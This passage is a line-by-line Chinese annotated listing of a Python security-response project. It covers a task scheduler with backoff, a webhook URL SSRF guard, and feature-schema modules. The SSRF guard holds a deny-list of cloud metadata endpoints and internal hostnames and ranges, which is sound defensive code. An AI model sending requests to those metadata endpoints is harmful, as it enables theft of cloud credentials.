| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        processed = 0` |
| 159 | 循环：逐个处理集合或迭代器中的元素。 | `        for task in due:` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            executed_attempts = task.attempt_count + 1` |
| 161 | 条件判断：满足条件时进入对应分支。 | `            if self._use_memory():` |
| 162 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self.mark_running_memory(task.id)` |
| 163 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._persist.update_schedule_task(` |
| 165 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    task.id,` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status="running",` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    attempt_count=executed_attempts,` |
| 168 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 169 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 170 | 条件判断：满足条件时进入对应分支。 | `                if task.task_type == TASK_SCHEDULED_UNBLOCK:` |
| 171 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    responder.execute_scheduled_unblock(` |
| 172 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        task.payload.get("ip", ""),` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        dry_run=bool(task.payload.get("dry_run")),` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        alert_id=task.alert_id,` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        schedule_task_id=task.id,` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._finish_task(task, success=True, error=None)` |
| 178 | 条件分支：前面条件不满足时继续判断。 | `                elif task.task_type == TASK_NOTIFY_RETRY:` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    ok = responder.execute_notify_retry(` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        subject=str(task.payload.get("subject", "")),` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        body=str(task.payload.get("body", "")),` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        meta=dict(task.payload.get("meta") or {}),` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        alert_id=task.alert_id,` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        schedule_task_id=task.id,` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        attempt=executed_attempts,` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        max_attempts=task.max_attempts,` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 188 | 条件判断：满足条件时进入对应分支。 | `                    if ok:` |
| 189 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self._finish_task(task, success=True, error=None)` |
| 190 | 兜底分支：处理前面条件都不满足的情况。 | `                    else:` |
| 191 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self._fail_or_reschedule(` |
| 192 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            task,` |
| 193 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            "notify_retry_all_failed",` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            now=ts,` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            executed_attempts=executed_attempts,` |
| 196 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 197 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 198 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._finish_task(task, success=False, error="unknown_task_type")` |
| 199 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 200 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.exception("[scheduler] task %s failed: %s", task.id, exc)` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._fail_or_reschedule(` |
| 202 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    task, str(exc), now=ts, executed_attempts=executed_attempts` |
| 203 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 204 | 代码语句：参与当前文件的业务流程或数据处理。 | `            processed += 1` |
| 205 | 返回结果：把处理后的值交回调用方。 | `        return processed` |
| 206 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 207 | 函数定义：声明 `_finish_task` 的输入、处理逻辑和返回结果。 | `    def _finish_task(self, task: ScheduleTaskRow, *, success: bool, error: Optional[str]) -> None:` |
| 208 | 条件判断：满足条件时进入对应分支。 | `        if self._use_memory():` |
| 209 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.complete_memory(task.id, status="completed" if success else "failed", last_error=error)` |
| 210 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 211 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._persist.update_schedule_task(` |
| 212 | 代码语句：参与当前文件的业务流程或数据处理。 | `            task.id,` |
| 213 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status="completed" if success else "failed",` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            last_error=error,` |
| 215 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 216 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 217 | 函数定义：声明 `_fail_or_reschedule` 的输入、处理逻辑和返回结果。 | `    def _fail_or_reschedule(` |
| 218 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task: ScheduleTaskRow,` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        err: str,` |
| 221 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now: datetime,` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        executed_attempts: int,` |
| 224 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempts = executed_attempts` |
| 226 | 条件判断：满足条件时进入对应分支。 | `        if attempts >= task.max_attempts:` |
| 227 | 条件判断：满足条件时进入对应分支。 | `            if self._use_memory():` |
| 228 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self.complete_memory(task.id, status="failed", last_error=err)` |
| 229 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 230 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._persist.update_schedule_task(` |
| 231 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    task.id, status="failed", attempt_count=attempts, last_error=err` |
| 232 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 233 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 234 | 注释：解释下面或当前这段代码的设计意图。 | `        # 退避重调度` |
| 235 | 导入对象：从指定模块引入类、函数或常量。 | `        from datetime import timedelta` |
| 236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        delay = timedelta(seconds=min(3600, 30 * (2 ** (attempts - 1))))` |
| 238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        new_run = now + delay` |
| 239 | 条件判断：满足条件时进入对应分支。 | `        if self._use_memory():` |
| 240 | 循环：逐个处理集合或迭代器中的元素。 | `            for i, t in enumerate(self._mem_tasks):` |
| 241 | 条件判断：满足条件时进入对应分支。 | `                if t.id == task.id:` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    self._mem_tasks[i] = ScheduleTaskRow(` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        id=t.id,` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        task_type=t.task_type,` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        alert_id=t.alert_id,` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        payload=t.payload,` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        run_at=new_run,` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        status="pending",` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        attempt_count=attempts,` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        max_attempts=t.max_attempts,` |
| 251 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        related_response_action_id=t.related_response_action_id,` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        last_error=err,` |
| 253 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 254 | 跳出循环：提前结束当前循环。 | `                    break` |
| 255 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 256 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persist.update_schedule_task(` |
| 257 | 代码语句：参与当前文件的业务流程或数据处理。 | `                task.id,` |
| 258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="pending",` |
| 259 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                attempt_count=attempts,` |
| 260 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                last_error=err,` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                run_at=new_run,` |
| 262 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |

## `src/response/webhook_url.py`

- 类型：自动响应
- 行数：121

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Webhook URL 防 SSRF：禁止本地、链路本地与云元数据常见地址。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import ipaddress` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import socket` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Optional, Tuple` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from urllib.parse import urlparse` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass(frozen=True)` |
| 14 | 类定义：声明 `WebhookUrlCheck`，封装相关状态与行为。 | `class WebhookUrlCheck:` |
| 15 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok: bool` |
| 16 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason: str = ""` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 函数定义：声明 `_is_blocked_ip` 的输入、处理逻辑和返回结果。 | `def _is_blocked_ip(addr: ipaddress._BaseAddress) -> bool:` |
| 20 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(addr, ipaddress.IPv4Address):` |
| 21 | 条件判断：满足条件时进入对应分支。 | `        if addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved:` |
| 22 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 23 | 条件判断：满足条件时进入对应分支。 | `        if addr == ipaddress.IPv4Address("0.0.0.0"):` |
| 24 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 25 | 注释：解释下面或当前这段代码的设计意图。 | `        # 云元数据（常见 IPv4）` |
| 26 | 条件判断：满足条件时进入对应分支。 | `        if addr in ipaddress.ip_network("169.254.169.254/32"):` |
| 27 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 28 | 注释：解释下面或当前这段代码的设计意图。 | `        # 典型内网（Webhook 不应指向内网服务）` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        blocked_nets = (` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("10.0.0.0/8"),` |
| 31 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("172.16.0.0/12"),` |
| 32 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("192.168.0.0/16"),` |
| 33 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("127.0.0.0/8"),` |
| 34 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("169.254.0.0/16"),` |
| 35 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("100.64.0.0/10"),` |
| 36 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ipaddress.ip_network("0.0.0.0/8"),` |
| 37 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 38 | 返回结果：把处理后的值交回调用方。 | `        return any(addr in n for n in blocked_nets)` |
| 39 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(addr, ipaddress.IPv6Address):` |
| 40 | 条件判断：满足条件时进入对应分支。 | `        if addr.is_loopback or addr.is_link_local or addr.is_multicast:` |
| 41 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 42 | 条件判断：满足条件时进入对应分支。 | `        if addr == ipaddress.IPv6Address("::1"):` |
| 43 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 44 | 条件判断：满足条件时进入对应分支。 | `        if addr in ipaddress.ip_network("fe80::/10"):` |
| 45 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 46 | 注释：解释下面或当前这段代码的设计意图。 | `        # AWS/GCP 等 IPv6 元数据（占位，保守拒绝 ULA 与未指定）` |
| 47 | 条件判断：满足条件时进入对应分支。 | `        if addr in ipaddress.ip_network("fd00::/8"):` |
| 48 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 49 | 返回结果：把处理后的值交回调用方。 | `    return False` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 函数定义：声明 `check_webhook_url_safe` 的输入、处理逻辑和返回结果。 | `def check_webhook_url_safe(url: str) -> WebhookUrlCheck:` |
| 53 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `    解析 URL，校验 scheme/host，并对解析后的 IP 做 SSRF 防护。` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `    禁止：非 http(s)、localhost、127.0.0.0/8、169.254.169.254、内网网段、裸 IP字面量中的阻断段。` |
| 57 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 58 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(url, str) or not url.strip():` |
| 59 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "empty_url")` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw = url.strip()` |
| 61 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parsed = urlparse(raw)` |
| 63 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:  # noqa: BLE001` |
| 64 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "parse_error")` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    scheme = (parsed.scheme or "").lower()` |
| 67 | 条件判断：满足条件时进入对应分支。 | `    if scheme not in ("http", "https"):` |
| 68 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "scheme_not_http")` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    host = parsed.hostname` |
| 71 | 条件判断：满足条件时进入对应分支。 | `    if not host:` |
| 72 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "missing_host")` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    host_lower = host.lower()` |
| 75 | 条件判断：满足条件时进入对应分支。 | `    if host_lower == "localhost" or host_lower.endswith(".localhost"):` |
| 76 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "localhost_forbidden")` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 注释：解释下面或当前这段代码的设计意图。 | `    # 常见云元数据 / 内网解析名（不依赖 DNS 即可拒绝）` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _blocked_hostnames = frozenset(` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "metadata.google.internal",` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "metadata.goog",` |
| 83 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "metadata",` |
| 84 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "kubernetes.default",` |
| 85 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "kubernetes.default.svc",` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "kubernetes.default.svc.cluster.local",` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "instance-data.ec2.internal",` |
| 88 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 90 | 条件判断：满足条件时进入对应分支。 | `    if host_lower in _blocked_hostnames:` |
| 91 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "blocked_hostname")` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 注释：解释下面或当前这段代码的设计意图。 | `    # 直接 IPv4 / IPv6 字面量` |
| 94 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        addr = ipaddress.ip_address(host)` |
| 96 | 条件判断：满足条件时进入对应分支。 | `        if _is_blocked_ip(addr):` |
| 97 | 返回结果：把处理后的值交回调用方。 | `            return WebhookUrlCheck(False, "blocked_ip_literal")` |
| 98 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(True, "")` |
| 99 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except ValueError:` |
| 100 | 占位语句：保持语法完整但当前不执行操作。 | `        pass` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 注释：解释下面或当前这段代码的设计意图。 | `    # DNS 解析（仅校验首轮 A/AAAA；解析失败不视为“安全”，拒绝）` |
| 103 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)` |
| 105 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except OSError:` |
| 106 | 返回结果：把处理后的值交回调用方。 | `        return WebhookUrlCheck(False, "dns_resolution_failed")` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 循环：逐个处理集合或迭代器中的元素。 | `    for _fam, _type, _proto, _canon, sockaddr in infos:` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip_str: Optional[str] = None` |
| 110 | 条件判断：满足条件时进入对应分支。 | `        if len(sockaddr) >= 1 and isinstance(sockaddr[0], str):` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ip_str = sockaddr[0]` |
| 112 | 条件判断：满足条件时进入对应分支。 | `        if not ip_str:` |
| 113 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 114 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            addr = ipaddress.ip_address(ip_str)` |
| 116 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError:` |
| 117 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 118 | 条件判断：满足条件时进入对应分支。 | `        if _is_blocked_ip(addr):` |
| 119 | 返回结果：把处理后的值交回调用方。 | `            return WebhookUrlCheck(False, f"resolved_to_blocked:{ip_str}")` |
| 120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 121 | 返回结果：把处理后的值交回调用方。 | `    return WebhookUrlCheck(True, "")` |

## `src/schema/__init__.py`

- 类型：数据结构/Schema
- 行数：28

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""特征 schema 契约与 model_manifest 校验（R3 / P0）。"""` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 导入对象：从指定模块引入类、函数或常量。 | `from .feature_schemas import (` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `    SCHEMA_IDS,` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    attach_network_flow_v1_block,` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    validate_payload_against_schema,` |
| 7 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from .manifest import (` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ManifestLoadError,` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ModelManifest,` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    load_manifest_for_model_path,` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    validate_manifest_dict,` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from .nsl_kdd_adapter import NSLKDDAdapter, NSL_KDD_FEATURE_COLUMNS` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from .persist import write_model_manifest` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = [` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "SCHEMA_IDS",` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "ModelManifest",` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "ManifestLoadError",` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "load_manifest_for_model_path",` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "validate_manifest_dict",` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "validate_payload_against_schema",` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "attach_network_flow_v1_block",` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "NSLKDDAdapter",` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "NSL_KDD_FEATURE_COLUMNS",` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "write_model_manifest",` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |

## `src/schema/feature_schemas.py`

- 类型：数据结构/Schema
- 行数：153

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `版本化特征 schema 定义与运行时校验。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `契约 JSON 位于同目录 \`\`json/*.json\`\`，供训练 / 在线 / 审计引用同一来源。` |
| 5 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 6 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Mapping, MutableMapping, Optional, Set, Tuple` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_SCHEMA_DIR = Path(__file__).resolve().parent / "json"` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `SCHEMA_IDS: Tuple[str, ...] = (` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "network_flow_v1",` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "web_request_v1",` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "system_behavior_v1",` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "ioc_match_v1",` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数定义：声明 `_load_schema_doc` 的输入、处理逻辑和返回结果。 | `def _load_schema_doc(schema_id: str) -> dict:` |
| 23 | 条件判断：满足条件时进入对应分支。 | `    if schema_id not in SCHEMA_IDS:` |
| 24 | 抛出异常：主动报告不可继续的错误。 | `        raise KeyError(f"未知 schema_id: {schema_id}，已知: {SCHEMA_IDS}")` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    path = _SCHEMA_DIR / f"{schema_id}.json"` |
| 26 | 条件判断：满足条件时进入对应分支。 | `    if not path.is_file():` |
| 27 | 抛出异常：主动报告不可继续的错误。 | `        raise FileNotFoundError(f"缺少 schema 文件: {path}")` |
| 28 | 上下文管理：自动管理资源打开与释放。 | `    with path.open(encoding="utf-8") as f:` |
| 29 | 返回结果：把处理后的值交回调用方。 | `        return json.load(f)` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 函数定义：声明 `_flatten_web_features` 的输入、处理逻辑和返回结果。 | `def _flatten_web_features(features: Mapping[str, Any]) -> Dict[str, Any]:` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: Dict[str, Any] = dict(features)` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    wr = features.get("web_request_v1")` |
| 35 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(wr, dict):` |
| 36 | 循环：逐个处理集合或迭代器中的元素。 | `        for k, v in wr.items():` |
| 37 | 条件判断：满足条件时进入对应分支。 | `            if k == "schema":` |
| 38 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `            out.setdefault(k, v)` |
| 40 | 条件判断：满足条件时进入对应分支。 | `    if "url" not in out or out.get("url") in (None, ""):` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw = out.get("url_raw")` |
| 42 | 条件判断：满足条件时进入对应分支。 | `        if raw is not None:` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            out["url"] = raw` |
| 44 | 条件判断：满足条件时进入对应分支。 | `    if "method" not in out or out.get("method") in (None, ""):` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = features.get("http_method") or features.get("method")` |
| 46 | 条件判断：满足条件时进入对应分支。 | `        if m is not None:` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            out["method"] = str(m).upper()` |
| 48 | 返回结果：把处理后的值交回调用方。 | `    return out` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 函数定义：声明 `_flatten_network_flow_features` 的输入、处理逻辑和返回结果。 | `def _flatten_network_flow_features(features: Mapping[str, Any]) -> Dict[str, Any]:` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: Dict[str, Any] = dict(features)` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    nf = features.get("network_flow_v1")` |
| 54 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(nf, dict):` |
